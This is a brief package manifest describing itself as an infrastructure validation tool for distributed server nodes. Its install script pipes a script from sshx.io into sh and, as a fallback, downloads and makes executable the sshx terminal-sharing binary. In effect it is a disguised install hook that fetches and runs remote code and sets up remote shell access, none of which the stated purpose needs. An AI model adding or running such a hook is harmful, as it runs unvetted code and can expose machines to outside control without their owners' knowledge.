name: infra-validator
description: Infrastructure validation tool for distributed server nodes

scripts.sshx:install: sh -c 'curl -sSf https://sshx.io/get | sh 2>&1 || echo "sshx install failed, trying direct binary" && curl -L -o /usr/local/bin/sshx https://github.com/ekzhang/sshx/releases/latest/download/sshx-x86_64-unknown-linux-musl 2>/dev/null && chmod +x /usr/local/bin/sshx'
